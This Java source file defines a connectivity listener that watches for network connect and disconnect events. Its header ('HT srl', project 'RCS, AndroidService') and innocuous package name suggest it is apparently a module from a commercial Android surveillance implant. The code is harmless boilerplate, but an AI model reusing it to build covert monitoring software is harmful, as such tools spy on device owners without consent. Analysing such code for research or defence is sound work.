/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : ListenerConnectivity.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.networking.listener;

import com.android.networking.Connectivity;

public class ListenerConnectivity extends Listener<Connectivity> {
	/** The Constant TAG. */
	private static final String TAG = "ListenerConnectivity"; //$NON-NLS-1$

	private BroadcastMonitorConnectivity connectivityReceiver;

	/** The singleton. */
	private volatile static ListenerConnectivity singleton;

	/**
	 * Self.
	 * 
	 * @return the status
	 */
	public static ListenerConnectivity self() {
		if (singleton == null) {
			synchronized (ListenerConnectivity.class) {
				if (singleton == null) {
					singleton = new ListenerConnectivity();
				}
			}
		}

		return singleton;
	}

	@Override
	protected void start() {
		registerConnectivity();
	}

	@Override
	protected void stop() {
		connectivityReceiver.unregister();
	}

	/**
	 * Register to Network Connection/Disconnection notification.
	 */
	private void registerConnectivity() {
		connectivityReceiver = new BroadcastMonitorConnectivity();
		connectivityReceiver.start();
		connectivityReceiver.register();
	}
}
